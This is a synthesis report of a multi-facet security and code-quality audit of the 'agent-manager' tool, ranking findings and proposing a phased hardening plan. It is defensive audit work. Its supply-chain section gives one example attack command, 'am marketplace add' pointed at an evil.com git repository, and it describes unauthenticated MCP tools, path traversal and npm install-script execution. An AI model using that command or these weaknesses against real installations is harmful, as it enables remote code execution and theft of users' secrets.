# Multi-Agent Deep Analysis — Synthesis

**Date:** 2026-04-16
**Scope:** agent-manager 0.4.0
**Method:** 10 parallel specialist agents, each covering one facet; this doc synthesizes cross-cutting findings from their reports.
**Per-facet reports:** `01-architecture.md` … `10-build-release-ci.md` in this folder.

## Health Scorecard

| # | Facet | Score | Critical | High | Summary |
|---|-------|------:|---------:|-----:|---------|
| 01 | Architecture | 7/10 | 0 | 4 | Clean bones; 3 kitchen-sink files and one duplicated registry. |
| 02 | Adapters | 7/10 | 0 | 3 | No atomic writes; community install accepts unsanitized sources. |
| 03 | MCP server | 6.5/10 | 0 | 3 | Zero runtime input validation; path-traversal in session cancel; error envelopes can leak secrets. |
| 04 | Protocols | 6.5/10 | 1 | 4+ | Bridge permission policy is dead config; ACP leaks subprocess on init failure. |
| 05 | Marketplace | 5/10 | 0 | 3 | Claude Code compat is schema-shallow; zero supply chain controls; adapter checksum unused. |
| 06 | CLI UX | 7/10 | 0 | 2 | Completion is out of sync; 4 commands bypass the output layer. |
| 07 | Security | 6.5/10 | 0 | 7 | Master key colocated with ciphertext; unauth MCP `am_apply`; `npm install` without `--ignore-scripts`. |
| 08 | Testing | 6.5/10 | — | — | `am apply` no e2e; community proxy tested with empty mock; ~15 command files test primitives not handlers. |
| 09 | Docs & ADRs | 7/10 | — | — | 4 accepted ADRs still labeled "proposed"; no community adapter author guide. |
| 10 | Build / CI | 6/10 | — | 3 | No binary signing; no `bun pm audit`/CodeQL/dependabot; version fallback lies (`0.1.0` default). |

**Overall:** ~6.5–7/10. Strong bones, clear architectural intent, honest test count. Held back by a consistent pattern: **features shipped, hardening deferred.**

## Cross-Cutting Themes

Findings cluster into six themes that span multiple facets. Fixing by theme is more efficient than by report.

### Theme A — "Declared but not enforced"

Config knobs and interface promises that look wired but aren't.

- **Bridge permissionPolicy / allowedPaths** never passed to ACP client (04 HIGH).
- **Adapter checksum verifier** reads `sha256` but installer never writes one — every load logs "no checksum, skipping" (05 HIGH, 02 HIGH).
- **MCP tool `inputSchema`** declarative only; handlers cast `args.foo as string` with no Zod/schema check (03 HIGH).
- **`--yes` flag** on marketplace exists but ignored (05 MEDIUM).
- **`AmError` structured errors** used by ~7 of 31 commands; rest fall back to bare strings losing `suggestion`/`code` in `--json` (06 HIGH).

**Why this matters:** these give a false sense of security/correctness in code review and in docs. Each one is a promise the tool doesn't keep.

**Fix shape:** treat "declared" as a code smell. For each knob: either wire it end-to-end or delete it. A linter/test rule can catch unused config fields going forward.

### Theme B — "Supply chain is trust-on-first-everything"

Three independent install paths (adapters, marketplace plugins, npm deps) share the same gap: no URL validation, no size cap, no commit pin, no TOFU prompt, no integrity check.

- **Community adapter install** runs `npm install` without `--ignore-scripts` → RCE before any checksum runs (07 HIGH).
- **Marketplace git clone**: no URL validation, no size/timeout, no commit SHA pinning (05 HIGH).
- **Adapter source resolution** accepts `local:` paths unbounded; repo basename becomes adapter name, enabling name-squat of built-ins with `--force` (02 HIGH).
- **Plugin `skills.path`**: path traversal possible (07 HIGH-4, reiterated in 05).

**Why this matters:** the "install from untrusted git URL" use case is the core value proposition of the marketplace. Right now, `am marketplace add https://evil.com/x.git && am install foo` gets RCE on next `am apply`.

**Fix shape:** minimal but layered — (1) pinned commit SHAs in `marketplaces.json`, (2) `--ignore-scripts` on npm install, (3) TOFU-style first-use prompt with checksum, (4) path-traversal scrubber that normalizes every manifest path.

### Theme C — "The `am apply` write path has no safety net"

Every end-of-pipeline operation writes to user config files in home dir. Across the reports, this exact surface keeps appearing as unguarded.

- **No atomic writes** in any of 13 adapter exports (direct `writeFileSync`). SIGTERM corrupts `~/.claude.json` (02 HIGH).
- **No e2e integration test** for `am apply` — highest-risk untested workflow (08 HIGH).
- **MCP `am_apply` unauth'd** on `write-local` tier — any plumbed-in agent decrypts all secrets and writes them (07 HIGH-2).
- **Error envelopes** from `am_apply`, `am_run_agent`, `am_agent_delegate` pass raw `errorMessage(e)` — can contain tokens (03 HIGH).

**Fix shape:** one hardening pass that touches the write path: tmp-file + rename in a shared helper, CI-level e2e apply test with golden files, auth gate on MCP write-tier tools, redactor on error messages (mirror the one already on `am_config_show`).

### Theme D — "Concurrency & lifecycle leaks"

Subprocesses, SSE streams, and in-memory caches that outlive their owners.

- **ACP `connect()` leaks subprocess** on init failure — no try/catch around initialize race (04 CRITICAL).
- **Module-level `terminalStore`** leaks across clients; stdout drained incorrectly (04 HIGH).
- **Community proxy stderr** piped but never drained — deadlocks on chatty adapters. `killAllProxies()` exists but wired to zero exit handlers (02 HIGH).
- **Two adapter caches** (registry + loader) can disagree (02 MEDIUM).
- **SSE 5-min idle timeout, no heartbeat** — proxies will kill long tasks (04 HIGH).

**Fix shape:** audit every subprocess spawn for cleanup path (not just happy path); add `process.on('exit')` / `SIGINT` handlers that call `killAllProxies`; add SSE heartbeat ping every 30s; collapse duplicate caches.

### Theme E — "Parallel implementations drifting"

Multiple places that should be one.

- **Two ACP agent registries** (`core/agent-registry.ts` and `protocols/acp/registry.ts`) — identical 16-entry dicts, ADR-0030's "unified" never displaced the protocol-local one (01 HIGH-1).
- **Two identical command fallbacks** (`0.1.0` in `cli.ts` and `version.ts`) vs `0.0.0-dev` in `build.ts` — no CI gate asserting binary matches package.json (10 HIGH-3).
- **Core reaches into commands**: `core/merge.ts` imports from `commands/import.ts`; 4 non-command modules import from `commands/use.ts` (01 HIGH-2, HIGH-3).
- **ADR-0030 "unified registry"** is in the code but not used consistently (01, 09).

**Fix shape:** one-week "pull up" pass — extract `extractServerIdentity` and `readActiveProfile`/`writeActiveProfile` to `core/`; collapse agent registry to a single source; add a CI test asserting `am --version` == `package.json.version`.

### Theme F — "Docs describe the v0.4 the team wishes existed"

- **4 ADRs** (0026, 0027, 0028, 0030) still `status: proposed` despite shipped code (09 HIGH-1).
- **No community adapter author guide** — JSON-RPC contract only in source comments (09 HIGH-2, 05 MEDIUM).
- **No CHANGELOG entries** for 15 iterations' worth of changes beyond the version bump (hinted in 09).
- **Test count disagrees across 3 files** (1864 vs 1859 vs 1916) (09 MEDIUM).

**Fix shape:** close the loop on ADR status after each iteration; write the one missing doc (community adapter author guide) since it's the explicit extensibility story.

## Severity-Aggregated Top 10

Ranked by aggregate impact across themes (severity + reach):

1. **ACP subprocess leak on init failure** — `protocols/acp/client.ts:112-170`. Real OS process accumulation. (Theme D)
2. **Bridge permission policy dead config** — `protocols/bridge.ts:89,105`. A2A bridged tasks run unrestricted. (Theme A)
3. **`am apply` has no atomic writes** across any of 13 adapters. Corruption on SIGTERM. (Theme C)
4. **MCP `am_apply` / write-tier tools unauth'd** — any agent decrypts every secret. (Theme C)
5. **AES master key in git-tracked config dir** alongside ciphertext. `commitAll` can push it. (Theme B adjacent, Security-07 HIGH-1)
6. **`npm install` without `--ignore-scripts`** on marketplace adapters. RCE on install. (Theme B)
7. **Zero runtime validation on MCP tool inputs** — type mismatches propagate silently. (Theme A)
8. **Parallel ACP agent registries** in `core/` and `protocols/`. Drift inevitable. (Theme E)
9. **Path traversal** in `am_acp_session_cancel` and plugin `skills.path`. (Theme B, C)
10. **No binary signing / notarization** — macOS exit 137 Gatekeeper kill with no error. (Build-10 HIGH-1)

## Recommended Fix Order (if we do another iteration)

Phase 1 — **Hard safety net** (1–2 days):
- Atomic writes everywhere (one helper, all 13 adapters).
- `--ignore-scripts` on community npm install.
- Wire bridge permissionPolicy/allowedPaths through to ACP client.
- Try/catch around ACP `connect()` + initialize; kill subprocess on failure.
- Redactor on MCP error envelopes.

Phase 2 — **Supply chain minimum** (1–2 days):
- Commit SHA pinning in `marketplaces.json`.
- First-install TOFU checksum capture (wire the unused verifier).
- Path-traversal scrubber on all manifest-sourced paths.
- Master key out of git-tracked dir; add `.gitignore` rule + migration.

Phase 3 — **Tidy** (1 day):
- Collapse duplicate ACP registries; extract shared primitives out of commands/.
- Zod validation layer on MCP tool inputs.
- CI gate: `am --version` == `package.json.version`.
- Flip ADR 0026/0027/0028/0030 status to accepted; write community adapter author guide.
- Add `am apply` end-to-end integration test with golden files.

Phase 4 — **Polish** (ongoing):
- `bun pm audit`, CodeQL, dependabot.
- Binary signing + notarization (darwin).
- Completion drift fix (completion generator reads command tree).

No v1.0 unlock until Phase 1 + Phase 2 land. Current 0.4.0 is functionally rich but not hardened enough to ship unsupervised.

## What the Analysis Got Right, What It Missed

**Confirmed from prior iterations:**
- `listInstalled()` scans servers + skills + agents (marketplace report confirmed fixed).
- Adapter interface async-compatible (adapter report confirmed).
- CI `integration` job seeds configs and builds linux-x64 (CI report confirmed).

**New findings not caught by prior iteration reviews:**
- Bridge permissionPolicy is dead config (iteration 10 shipped it declared).
- Two ACP agent registries exist (ADR-0030 shipped without removing the old one).
- MCP tools have no runtime input validation (iteration 8+ added tools but relied on declarative schema).
- Master key + ciphertext both git-tracked (iteration 3's encryption never revisited its storage assumption).

**Areas the analysis did NOT cover (scope limits):**
- Performance profiling (startup time, large config import latency).
- Memory leaks under long-running `am mcp` daemon.
- Cross-platform compatibility (only linux-x64 tested in CI integration).
- Accessibility of TUI (`src/tui/`) — not inspected.
- Web wiki (`src/web/`) UI — not inspected.

A follow-up team should hit those gaps if this becomes a v0.5 planning input.
